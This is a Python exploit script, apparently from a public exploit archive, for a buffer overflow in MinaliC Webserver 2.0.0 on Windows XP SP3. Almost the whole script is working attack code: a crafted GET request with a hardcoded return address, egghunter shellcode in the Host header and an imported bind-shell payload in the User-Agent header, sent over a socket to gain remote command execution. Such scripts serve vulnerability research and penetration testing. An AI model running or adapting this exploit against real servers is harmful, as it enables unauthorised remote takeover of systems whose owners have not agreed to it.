#!/usr/bin/env python
 
# Exploit Title: MinaliC Webserver buffer overflow (egghunter)
# Date: August 13 2013
# Exploit Author: PuN1sh3r 
# Email: luiguibiker@gmail.com
# Vendor Homepage: http://minalic.sourceforge.net/
# Version: MinaliC Webserver 2.0.0
# Tested on: Windows XP Pro SP3, English
#
# Description:
# Remote command execution by triggering a buffer overflow in the GET 
# request along with some buffer gymnastics using egghunters in order to attain a shell .
# gr33zt to superkojiman for the initial exploit  
from payload import buf
import socket
import struct
def shell_attack(target_machine, target_port):

    # windows/shell_bind_tcp  http://www.metasploit.com
    # * VERBOSE=false, LPORT=443, RHOST=, EXITFUNC=process,InitialAutoRunScript=, AutoRunScript=

    
    # Return addres Note:
    # 77C11F13  JMP EBX on msvcrt.dll Windows XP SP3 English
    ret = b"\x13\x1F\xC1\x77" 
    junk = b"\x41" *  245 + ret
    host = b"\x90" * 30 + b"A" * 40  + b"\x90" * 31

    egg =  b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x54\x30\x30\x57\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7" 
    buffer = b"GET /" + junk + b" HTTP/1.1\r\n" + b"Host: " + b"\x90" * (100 - len(egg)) + egg     + b"\r\n"
    buffer += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    buffer += b"User-Agent: " + b"T00W" + b"T00W" +  b"\x90" * (900 - len(buf)) + buf  + b"\r\n\r\n" 
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_machine, target_port))
    s.send(buffer)